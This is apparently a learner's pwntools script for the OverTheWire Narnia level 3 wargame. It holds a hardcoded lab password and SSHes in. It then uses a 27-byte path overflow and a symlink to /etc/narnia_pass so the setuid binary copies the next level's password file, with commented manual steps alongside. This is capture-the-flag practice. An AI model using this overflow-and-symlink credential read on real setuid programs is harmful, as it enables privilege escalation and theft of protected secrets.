#Ok so i finished this level and everything that i ran should work i just need to figure out
#how to make it work with pwntools. I'll skip this for now
from pwn import *
import time
import subprocess

#i like the debug context whenever i use pwntools
context.log_level='debug'
# these are all pretty self explanatory
level=3
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='vaequeezee'
port=2226

filename=str(raw_input("Please name your file :"))
print ("The file is going to be named " + filename)
#oflow=(cyclic(27))
oflow="b"*27
filepath="/tmp/" + oflow + "/tmp/" + filename
exe="/narnia/./narnia3 "

#/narnia/narnia3 /tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp/oreocookie

def conn():
    #basically just sshs into the level
    return ssh(user=user, host=host, password=password, port=port)
#def getPass(shell):
#    #this function prints the password
#    print('The password for the next level is...')
#    shell.sendline('cat /etc/narnia*/narnia' + str(level+1))
#    flag=shell.recvuntil('$').split()[0]
#def readCode(shell):
#    #this function downloads the narnialevel.c file and displays it, and at the end removes the .c
#    #file
#    code=shell.download_data('/narnia/' + user + '.c')
#    shell.download_file('/narnia/' + user + '.c')
#    log.info('The code for this level is')
#    print(code)
#    subprocess.call(['rm',user+'.c'])
#
payloadx="rm /tmp/" + filename
payloady="rm -r /tmp/" + oflow
payload0="touch /tmp/" + filename 
payload1="chmod 777 /tmp/" + filename 
payload2="mkdir /tmp/" + oflow 
payload3="cd /tmp/" + oflow 
payload4="mkdir tmp"
payload5="cd tmp/"
payload6="ln -s /etc/narnia_pass/narnia ./" + filename 
payload7=exe + filepath 
payload8="cat /tmp/" +filename


##This are the commands used for completing the level
#
##touch /tmp/oreocookie
##chmod 777 /tmp/oreocookie
##cd ./$(python -c'print "b"*27')
##mkdir /tmp/
##cd /tmp/
##ln -s /etc/narnia_pass/narnia4 ./oreocookie
##/narnia/narnia3 $(python -c'print "/tmp/" + "b"*27 + "/tmp/oreocookie"')')
##cat /tmp/oreocookie
#
#
#print(payload0)
#print(payload1)
#print(payload2)
#print(payload3)
#print(payload4)
#print(payload5)
#print(payload6)
#print(payload7)
#print(payload8)
sh=conn()
#readCode(sh)
io=sh.shell("bash") 
#
io.sendline(payloadx)
io.sendline(payloady)
io.sendline(payload0) #the payload is sent
time.sleep(2)
io.sendline(payload1) #the payload is sent
time.sleep(2)
io.sendline(payload2) #the payload is sent
time.sleep(2)
io.sendline(payload3) #the payload is sent
time.sleep(2)
io.sendline(payload4) #the payload is sent
time.sleep(2)
io.sendline(payload5) #the payload is sent
time.sleep(2)
io.sendline(payload6) #the payload is sent
time.sleep(2)
io.sendline(payload7) #the payload is sent
time.sleep(2)
io.sendline(payload8) #the payload is sent
#
##flag=getPass(io) #the password is found
#
io.interactive() #puts it into interactive mode so you can play around
